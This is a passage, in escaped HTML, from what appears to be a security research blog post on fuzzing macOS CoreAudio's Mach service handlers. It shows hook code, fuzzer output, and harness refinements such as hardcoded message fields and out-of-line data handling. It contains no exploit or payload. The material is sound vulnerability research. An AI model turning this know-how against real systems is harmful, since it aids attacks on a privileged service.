 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SetRegister(RIP, GetReturnAddress());&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;$RIP register is now: %p\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;, GetRegister(ARCH_PC));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SetRegister(RSP, GetRegister(RSP) + &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;); &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Simulate a ret instruction&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;$RSP is now: %p\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;, GetRegister(RSP));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot; style=&quot;padding-top: 10pt&quot;&gt;&lt;span&gt;Next, I modified Jackalope to use my instrumentation using the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/Jackalope/blob/bd461f4adfc3e4e1cb14516661e57a202071ac2d/fuzzer.h#L163&quot;&gt;CreateInstrumentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. That way, my hook was applied during each fuzzing iteration, and the annoying &lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;NULL&lt;/span&gt; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CFRelease&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls stopped happening. The output below shows the hook preventing a crash from a &lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;NULL&lt;/span&gt; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;plist&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;object passed the troublesome API:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Instrumented&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;CoreAudio,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;size:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;7516156&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Hooking&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;__ZN11HALS_System13_WriteSettingEP11HALS_ClientPK10__CFStringPKv&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;CoreAudio&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;HALS_SettingsManager::_WriteSetting&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Entered&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;plist&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;passed&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;argument,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;returning&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;prevent&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;CFRelease&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$RSP:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x7ff7bf83b358&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;address:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x7ff8451e7430&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$RIP:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x7ff84533a675&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$RIP&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;now:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x7ff8451e7430&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$RSP&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;now:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x7ff7bf83b360&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Total&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;execs:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;6230&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Unique&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;samples:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;184&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(0&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;discarded)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Crashes:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(2&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;unique)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Hangs:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Offsets:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;13550&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Execs/s:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;134&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The code to reproduce and build this fuzzer with custom instrumentation can be found here: &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz/jackalope-modifications&quot;&gt;https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz/jackalope-modifications&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.ek3f0s8v7aa&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Iteration 4: Improving Sample Structure&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The great thing about a fuzzing-centric auditing &lt;/span&gt;&lt;span&gt;technique&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;is that it highlights knowledge gaps in the code you are auditing. As you address these gaps, you gain a deeper understanding of the structure and constraints of the inputs that your fuzzing harness should generate. These insights enable you to refine your harness to produce more targeted inputs, effectively penetrating deeper code paths and improving overall code coverage. The following subsections highlight examples of how I identified and implemented opportunities to iterate on my fuzzing harness, significantly enhancing its efficiency and effectiveness.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.9umxs616p0iv&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c11&quot;&gt;Message Handler Syntax Checks&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c11&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Code coverage results from fuzzing runs are incredibly telling. I noticed that after running my fuzzer for a few days, it was having trouble exploring past the beginning of most of the Mach message handlers. One simple example is shown below, (explored basic blocks are highlighted in blue) where several comparisons were not being passed , causing the function to error out early on. Here, the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;rdi&lt;/span&gt;&lt;span&gt;&amp;nbsp;register is the incoming Mach message we sent to the handler.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5jyTHzfey6XQhfBNx-QTSVjgvoFWQTPpJgq_i1uVkMenlJ06MtltfgNhF_s4CaU21ygbGy3HBJyKh2O7mThgNrBec8Gy1SchRaXQdQW2Q3BIpfi9qIXQqF-ENy3TJvzI2uJZMrazG7Qpr-x4TXBMAVI5OOIsNRKk7OhoTP8Kc6jWnMVhOjFeX8b_inBU/s1520/image6.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5jyTHzfey6XQhfBNx-QTSVjgvoFWQTPpJgq_i1uVkMenlJ06MtltfgNhF_s4CaU21ygbGy3HBJyKh2O7mThgNrBec8Gy1SchRaXQdQW2Q3BIpfi9qIXQqF-ENy3TJvzI2uJZMrazG7Qpr-x4TXBMAVI5OOIsNRKk7OhoTP8Kc6jWnMVhOjFeX8b_inBU/s1200/image6.png&quot; border=&quot;0&quot; alt=&quot;A flowchart of disassembled code for a function _XIOContext_SetClientControlPort. Several conditional branches are shown, labeled Error Out&amp;quot; leading away from the main execution path. The Rest of Functionality block at the bottom includes a call to HALS_IOContext_SetClientControlPort.&quot; style=&quot;max-height: 750px; max-width: 500px;&quot;title=&quot;A flowchart of disassembled code for a function _XIOContext_SetClientControlPort. Several conditional branches are shown, labeled Error Out&amp;quot; leading away from the main execution path. The Rest of Functionality block at the bottom includes a call to HALS_IOContext_SetClientControlPort.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The comparisons were checking that the Mach message was well formatted, with a message length set to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;and various options set within the message. If it wasn&amp;rsquo;t, it was discarded.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;With this in mind, I modified my fuzzing harness to set the fields in the Mach messages I sent to the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XIOContext_SetClientControlPort&lt;/span&gt;&lt;span&gt;&amp;nbsp;handler such that they passed these conditions. The fuzzer could modify other pieces of the message as it pleased, but since these aspects needed to conform to strict guidelines, I simply hardcoded &lt;/span&gt;&lt;span&gt;them&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;These small modifications were the beginning of an input structure I was building for my target. The efficiency of my fuzzing improved astronomically after adding these guidelines to the &lt;/span&gt;&lt;span&gt;fuzzer&lt;/span&gt;&lt;span&gt;&amp;nbsp;- my code coverage increased by 2000&lt;/span&gt;&lt;span&gt;%&lt;/span&gt;&lt;span&gt;&amp;nbsp;shortly &lt;/span&gt;&lt;span&gt;thereafter&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.9umxs616p0iv&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c11&quot;&gt;Out-of-Line (OOL) Message Data&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I noticed my fuzzing setup started generating tons of crashes from a call to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mig_deallocate&lt;/span&gt;&lt;span&gt;, which &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/darwin-on-arm/xnu/blob/707bfdc4e9a46e3612e53994fffc64542d3f7e72/osfmk/mach/mig.h#L291&quot;&gt;frees a given address&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. At first, I thought I had found an interesting bug, since I could control the address passed to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mig_deallocate&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I quickly learned, however, that Mach messages can contain various types of &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://dmcyk.xyz/post/xnu_ipc_iii_ool_data/&quot;&gt;Out-of-line (OOL) data&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This allows a client to allocate a memory region and place a pointer to it &lt;/span&gt;&lt;span&gt;within the Mach message&lt;/span&gt;&lt;span&gt;, which will be processed and, in some cases, freed by the message handler. When sending a Mach message with the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mach_msg&lt;/span&gt;&lt;span&gt;&amp;nbsp;API, the &lt;/span&gt;&lt;span&gt;XNU kernel will validate that the memory pointed to by OOL descriptors is properly owned and accessible by the client &lt;/span&gt;&lt;span&gt;process&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I hadn&amp;rsquo;t found a vulnerability; my fuzzing harness was simply attached to the target at a point downstream which bypassed the normal memory checks that would have been performed by the kernel. To remedy this, I &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/blob/b9936f89d0fbde341df46f7d215c1e9c21381d9e/CoreAudioFuzz/harness.mm#L381&quot;&gt;modified my fuzzing harness&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;to&lt;/span&gt;&lt;span&gt;&amp;nbsp;support allocating space for OOL data and passing the valid memory address within the Mach messages I &lt;/span&gt;&lt;span&gt;fuzzed&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.fr6l0uii5w6h&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;The Vulnerability&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;After many fuzzing harness iterations, &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;lldb&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ldquo;next instruction&amp;rdquo; commands, and hours spent overheating my MacBook Pro, I had finally begun to acquire an understanding of the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;framework and generate some meaningful crashes.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;But first, some background knowledge.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.l8k6i8s8ljiz&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;The Hardware Abstraction Layer (HAL)&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;com.apple.audio.audiohald&lt;/span&gt;&lt;span&gt;&amp;nbsp;Mach service exposes an interface known as the Hardware Abstraction Layer (HAL). The HAL allows clients to interact with audio devices, plugins, and settings on the operating system, represented in the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;process as C++ objects of type &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;HALS_Object&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
